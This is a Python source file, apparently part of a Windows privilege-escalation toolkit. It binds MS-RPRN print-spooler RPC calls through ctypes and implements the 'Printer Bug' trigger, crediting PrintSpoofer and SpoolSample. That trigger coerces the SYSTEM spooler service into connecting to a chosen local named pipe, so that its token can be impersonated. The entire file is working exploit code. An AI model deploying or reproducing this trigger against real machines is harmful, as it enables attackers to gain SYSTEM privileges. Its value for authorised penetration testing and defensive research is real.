# -*- coding: UTF-8 -*-
# By Quentin HARDY (quentin.hardy@protonmail.com) - bobsecq

from ctypes.wintypes import *
from ctypes import *
from windef import *
import logging
from os import path
from utils import is32BitsProcess

MSRPRN_DLL_X86 = "external/dlls/MS-RPRN_x86.dll"
MSRPRN_DLL_X64 = "external/dlls/MS-RPRN_x64.dll"

CURRENT_PROCESS_32BITS = is32BitsProcess()

if CURRENT_PROCESS_32BITS == True:
    MSRPRN_DLL = MSRPRN_DLL_X86
else:
    MSRPRN_DLL = MSRPRN_DLL_X64

# Load DLL into memory.
logging.debug("Trying to load MS-RPRN dll: {0}".format(MSRPRN_DLL))
try:
    msrprndll = WinDLL (MSRPRN_DLL)
except Exception as e:
    logging.debug("Trying to load MS-RPRN dlls from parent folder")
    #Don't catch following error
    msrprndll = WinDLL(path.join('..\\',MSRPRN_DLL))

PRINTER_HANDLE = PVOID

#Constants
RPC_S_OK = 0
PRINTER_CHANGE_ADD_JOB = 0x00000100

#https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/c2b14fe7-6479-4460-a7ba-633a845dd61a
class DEVMODE_CONTAINER(Structure):
    _fields_ = [
        ("cbBuf", DWORD), #The size, in bytes, of the buffer pointed to by the pDevMode member.
        ("pDevMode", LPBYTE) # An optional pointer to a variable-length, custom-marshaled _DEVMODE structure.
    ]

PDEVMODE_CONTAINER = POINTER(DEVMODE_CONTAINER)

class RPC_V2_NOTIFY_OPTIONS_TYPE(Structure):
    _fields_ = [
        ("Type", c_ushort),
        ("Reserved0", c_ushort),
        ("Reserved1", DWORD),
        ("Reserved2", DWORD),
        ("Count", DWORD),
        ("pFields", POINTER(c_ushort)),
    ]

class RPC_V2_NOTIFY_OPTIONS(Structure):
    _fields_ = [
        ("Version", DWORD),
        ("Reserved", DWORD),
        ("Count", DWORD),
        ("pTypes", POINTER(RPC_V2_NOTIFY_OPTIONS_TYPE)),
    ]

#https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f
RpcOpenPrinter = msrprndll.RpcOpenPrinter
RpcOpenPrinter.argtypes = [LPWSTR, PRINTER_HANDLE, LPWSTR, PDEVMODE_CONTAINER, DWORD]
RpcOpenPrinter.restype = DWORD
#RpcOpenPrinter.errcheck = errcheck

RpcRemoteFindFirstPrinterChangeNotificationEx = msrprndll.RpcRemoteFindFirstPrinterChangeNotificationEx
RpcRemoteFindFirstPrinterChangeNotificationEx.argtypes = [PRINTER_HANDLE, DWORD, DWORD, LPWSTR, DWORD, POINTER(RPC_V2_NOTIFY_OPTIONS)]
RpcRemoteFindFirstPrinterChangeNotificationEx.restype = DWORD

RpcClosePrinter = msrprndll.RpcClosePrinter
RpcClosePrinter.argtypes = [PRINTER_HANDLE]
RpcClosePrinter.restype = DWORD

def connectToNamedPipeViaPrinter(subPipeName="toto"):
    '''
    Use Printer Bug for triggerring a SYSTEM named piped connection to \\MACHINE_NAME\\pipe\CONTROL_THIS\pipe\spoolss
    :return: False if an error. Return True
    Thanks: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
    Source: https://github.com/itm4n/PrintSpoofer/blob/975a93c2d56fb29ccbcc7fec0ea6da141626eb7c/PrintSpoofer/PrintSpoofer.cpp
    Help: https://github.com/leechristensen/SpoolSample/blob/96171c3e9d8b99d35c9af5430eef86090fb6e378/MS-RPRN/ms-rprn_h.h
    '''
    accessRequired = 0
    hPrinter = PVOID()
    targetServer = r"\\{0}".format("127.0.0.1")
    targetServer = create_unicode_buffer(targetServer)
    configBuffer = create_string_buffer(8192)
    devModeContainer = cast(configBuffer, POINTER(DEVMODE_CONTAINER))
    devModeContainer.cbBuf=0
    devModeContainer.pDevMode = None
    status = RpcOpenPrinter(targetServer, byref(hPrinter), None, devModeContainer, accessRequired)
    if status != RPC_S_OK:
        logging.error("Impossible to retrieve a handle for the local printer: {0}".format(getLastErrorMessage()))
        return False
    logging.debug("Handle to the local printer object is retrieved")
    captureServer = r"\\{0}/pipe/{1}".format("127.0.0.1", subPipeName)
    captureServer = create_unicode_buffer(captureServer)
    status = RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, captureServer, 0, None)
    if status != RPC_S_OK:
        logging.error("Impossible to create a remote change notification object. Named piped accessible ?: {0}".format(getLastErrorMessage()))
        return False
    status = RpcClosePrinter(byref(hPrinter))
    if status != RPC_S_OK:
        logging.warning("Impossible to close the handle to the printer object: {0}".format(getLastErrorMessage()))
    else:
        logging.debug("Handle to the printer object is closed")
    return True